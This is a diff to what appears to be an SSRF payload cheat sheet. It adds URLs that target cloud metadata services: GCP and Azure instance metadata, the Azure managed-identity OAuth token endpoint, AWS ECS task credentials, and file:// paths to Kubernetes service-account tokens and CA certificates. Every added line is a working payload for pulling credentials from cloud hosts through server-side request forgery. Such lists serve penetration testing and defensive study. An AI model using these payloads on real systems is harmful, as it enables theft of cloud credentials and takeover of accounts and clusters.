@@ -236,13 +236,23 @@ curl -s "https://target.com/api/fetch" \
 # GCP - requires Metadata-Flavor header (test if server adds it automatically)
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 http://169.254.169.254/computeMetadata/v1/project/project-id
+http://metadata/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/
 
 # AWS IMDSv1 (no auth required)
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/user-data
+# AWS ECS task credentials (retrieve from env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
 
-# Azure
+# Azure - instance metadata and managed identity token
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Requires Metadata: true header for Azure requests
+
+# Kubernetes service account credentials (file:// SSRF)
+file:///var/run/secrets/kubernetes.io/serviceaccount/token
+file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
 
 ### Localhost/Internal Port Payloads
